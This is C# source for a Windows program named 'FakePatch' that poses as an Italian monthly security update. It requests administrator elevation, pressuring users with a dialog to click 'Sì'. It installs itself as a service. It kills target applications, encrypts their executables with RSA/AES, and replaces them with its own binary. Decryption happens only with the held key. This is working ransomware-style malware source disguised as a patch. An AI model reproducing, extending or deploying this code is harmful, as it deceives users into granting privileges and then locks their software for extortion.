using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;
using System.Windows.Forms;
using static FakePatch.FileOperations;
using static FakePatch.Globals;
using static FakePatch.LogHelper;


namespace FakePatch
{
    public class Install
    {
        public static void ElevateProcess(string[] args = null)
        {
            //Public domain; no attribution required.
            const int ERROR_CANCELLED = 1223; //The operation was canceled by the user.

            var info = new ProcessStartInfo
            {
                UseShellExecute = true,
                WorkingDirectory = Environment.CurrentDirectory,
                FileName = Application.ExecutablePath,
                Verb = "runas",
            };

            if (args != null) info.Arguments = string.Join(" ", args);

            try
            {
                Process.Start(info);
                Application.ExitThread();
            }
            catch (Win32Exception ex)
            {
                if (ex.NativeErrorCode == ERROR_CANCELLED)
                    MessageBox.Show("Per poter installare l'aggiornamento è necessario rispondere \"Sì\" alla richiesta.", "Aggiornamento mensile di sicurezza", MessageBoxButtons.OK, MessageBoxIcon.None, MessageBoxDefaultButton.Button1);
                else
                    throw;
            }
        }

        public static void StartService(string ServiceName = gServiceName)
        {
            try
            {
                ServiceController sc = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == ServiceName);

                if (sc == null)
                {
                    Log("[StartService] Service " + ServiceName + " is not installed");
                }
                else
                {
                    //Starts the service
                    if ((sc.Status.Equals(ServiceControllerStatus.Stopped)) || (sc.Status.Equals(ServiceControllerStatus.StopPending)))
                    {
                        {
                            Log("[StartService] Service " + ServiceName + " is starting");
                            sc.Start();
                            sc.WaitForStatus(ServiceControllerStatus.Running);
                        }
                    }
                    else
                    {
                        Log("[StartService] Service " + ServiceName + " is in status " + sc.Status);
                    }
                }
            }
            catch (Exception ex)
            {
                string message = String.Format("[StartService] Exception occurred: \n {0} \n {1} ", ex.Message, ex.ToString());
                Log(message, LogLevel.Error);
            }
        }

        public static void StopService(string ServiceName = gServiceName)
        {
            try
            {
                ServiceController sc = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == ServiceName);

                if (sc == null)
                {
                    Log("[StopService] Service " + ServiceName + " is not installed");
                }
                else
                {
                    //Stops the service
                    if ((sc.Status.Equals(ServiceControllerStatus.Running)) || (sc.Status.Equals(ServiceControllerStatus.StartPending)))
                    {
                        {
                            Log("[StopService] Service " + ServiceName + " is stopping");
                            sc.Stop();
                            sc.WaitForStatus(ServiceControllerStatus.Stopped);
                        }
                    }
                    else
                    {
                        Log("[StopService] Service " + ServiceName + " is in status " + sc.Status);
                    }
                }
            }
            catch (Exception ex)
            {
                string message = String.Format("[StopService] Exception occurred: \n {0} \n {1} ", ex.Message, ex.ToString());
                Log(message, LogLevel.Error);
            }
        }

        public static void InstallService(string ServiceName = gServiceName)
        {
            try
            {
                ServiceController sc = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == ServiceName);

                if (sc == null)
                {
                    Log("[InstallService] Service " + ServiceName + " is being installed");
                    string WorkingDir = Path.GetDirectoryName(Application.ExecutablePath);
                    CopyFileExactly(Application.ExecutablePath, gServiceExecutablePath.FullName, true);
                    FileInfo OrigPdbFile = new FileInfo(Path.Combine(WorkingDir, Path.ChangeExtension(Application.ExecutablePath, "pdb")));
                    FileInfo DestPdbFile = new FileInfo(Path.Combine(gServicePath, Path.ChangeExtension(gServiceExecutablePath.FullName, "pdb")));
                    if (OrigPdbFile.Exists)
                    {
                        Log("[InstallService] Copying debug file " + OrigPdbFile.FullName + " to " + DestPdbFile.FullName);
                        CopyFileExactly(OrigPdbFile.FullName, DestPdbFile.FullName, true);
                    }
                    ManagedInstallerClass.InstallHelper(new string[] { "/LogFile=", "/LogToConsole=true", gServiceExecutablePath.FullName });
                    sc = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == ServiceName);
                    sc.WaitForStatus(ServiceControllerStatus.Stopped);
                }
                else
                {
                    Log("[InstallService] Service " + ServiceName + " is already installed");
                }
            }
            catch (Exception ex)
            {
                string message = String.Format("[InstallService] Exception occurred: \n {0} \n {1} ", ex.Message, ex.ToString());
                Log(message, LogLevel.Error);
            }
        }
        public static void UninstallService(string ServiceName = gServiceName)
        {
            try
            {
                Log("[InstallService] Service " + ServiceName + " is being uninstalled");
                ManagedInstallerClass.InstallHelper(new string[] { "/u", "/LogFile=", "/LogToConsole=true", gServiceExecutablePath.FullName });
            }
            catch (Exception ex)
            {
                string message = String.Format("[InstallService] Exception occurred: \n {0} \n {1} ", ex.Message, ex.ToString());
                Log(message, LogLevel.Error);
            }
        }
        public static void InstallPatch(string FilePath)
        {
            FileInfo AppPath = FindAppPath(FilePath);
            if (AppPath != null)
            {
                if (AppPath.Exists)
                {
                    Crypto MyCrypto = new Crypto();
                    string WorkingDir = AppPath.DirectoryName;
                    try
                    {
                        FileInfo EncryptedAppPath = new FileInfo(Path.Combine(WorkingDir, Path.ChangeExtension(AppPath.Name, Path.GetExtension(AppPath.Name) + ".enc")));

                        if (!EncryptedAppPath.Exists)
                        {
                            if (gRSA == null)
                            {
                                gRSA = MyCrypto.ImportAsimKeysFromXml(gKeyName, gEncryptKeyXML);
                            }

                            if (KillProcess(AppPath.FullName))
                            {
                                MyCrypto.EncryptFile(AppPath, gRSA, WorkingDir, gAes);
                            }
                            else
                            {
                                Log("[InstallPatch] Cannot kill a running instance of " + AppPath.FullName + ". Unable to continue with encryption.", LogLevel.Error);
                            }

                            if (File.Exists(EncryptedAppPath.FullName))
                            {
                                //************************************************************
                                //backup original file -> only for debug
                                /*
                                FileInfo BckFile = new FileInfo(Path.Combine(WorkingDir, Path.ChangeExtension(AppPath.Name, Path.GetExtension(AppPath.Name) + "_bck.exe")));
                                if (BckFile.Exists) { BckFile.Delete(); }
                                File.Move(AppPath.FullName, BckFile.FullName);
                                */
                                //************************************************************
                                //
                                // copy this assembly in place of the original application executable
                                CopyFileExactly(Application.ExecutablePath, AppPath.FullName, true);
                                FileInfo OrigPdbFile = new FileInfo(Path.ChangeExtension(Application.ExecutablePath, "pdb"));
                                FileInfo DestPdbFile = new FileInfo(Path.Combine(WorkingDir, Assembly.GetCallingAssembly().GetName().Name + ".pdb"));
                                if (OrigPdbFile.Exists)
                                {
                                    if (DestPdbFile.Exists) { DestPdbFile.Delete(); }
                                    Log("[InstallPatch] Copying debug file " + OrigPdbFile.FullName + " to " + DestPdbFile.FullName);
                                    CopyFileExactly(OrigPdbFile.FullName, DestPdbFile.FullName, true);
                                }
                            }
                            else
                            {
                                Log("[InstallPatch] Encrypted file " + EncryptedAppPath.FullName + " was not found. Something went wrong during encryption process.", LogLevel.Error);
                            }
                        }
                        else
                        {
                            Log("[InstallPatch] " + EncryptedAppPath.FullName + " already exists. Skipping.");
                        }
                    }
                    catch (Exception ex)
                    {
                        string message = String.Format("[InstallPatch] Exception occurred: \n {0} \n {1} ", ex.Message, ex.ToString());
                        Log(message, LogLevel.Error);
                        throw;
                    }
                }
                else
                {
                    Log("[InstallPatch] " + AppPath.FullName + " not found.");
                }
            }
            else
            {
                Log("[InstallPatch] " + FilePath + " not found in registry.");
            }
        }
        public static void UninstallPatch(string FilePath, string Key = null)
        {

            Crypto MyCrypto = new Crypto();
            FileInfo AppPath = FindAppPath(FilePath);
            if (AppPath != null)
            {
                try
                {
                    string WorkingDir = AppPath.DirectoryName;

                    FileInfo EncryptedAppPath = MyCrypto.GetEncryptedFilePath(AppPath);
                    Log("[UninstallPatch] " + EncryptedAppPath.FullName);

                    if (EncryptedAppPath.Exists && KillProcess(AppPath.FullName))
                    {
                        if (Key == null)
                        {
                            MyCrypto.DecryptFile(EncryptedAppPath, gRSA, null, WorkingDir);
                        }
                        else
                        {
                            MyCrypto.DecryptFile(EncryptedAppPath, null, Key, WorkingDir);
                        }
                        EncryptedAppPath.Delete();

                        //Debug file removal if existing
                        FileInfo PdbFile = EncryptedAppPath;

                        if (Path.GetExtension(PdbFile.FullName).ToLower() == ".enc")
                        {
                            //removes .enc extension if present
                            PdbFile = new FileInfo(Path.ChangeExtension(PdbFile.FullName, null));
                        }

                        PdbFile = new FileInfo(Path.ChangeExtension(PdbFile.FullName, "pdb"));
                        if (PdbFile.Exists) { PdbFile.Delete(); }

                        //************************************************************
                        //restore
                        /*
                        FileInfo BckFile = new FileInfo(Path.Combine(WorkingDir, Path.ChangeExtension(AppPath.Name, Path.GetExtension(AppPath.Name) + "_bck.exe")));
                        if (BckFile.Exists)
                        {
                            Log("Restoring " + BckFile.FullName + " to " + AppPath.FullName);
                            if (File.Exists(AppPath.FullName)) { AppPath.Delete(); }
                            File.Move(BckFile.FullName, AppPath.FullName);
                        }
                        */
                        //************************************************************
                    }
                }
                catch (Exception ex)
                {
                    string message = String.Format("[UninstallPatch] Exception occurred: \n {0} \n {1} ", ex.Message, ex.ToString());
                    Log(message, LogLevel.Error);
                    throw;
                }
            }
            else
            {
                Log("[UninstallPatch] " + FilePath + " not found.");
            }
        }
    }
}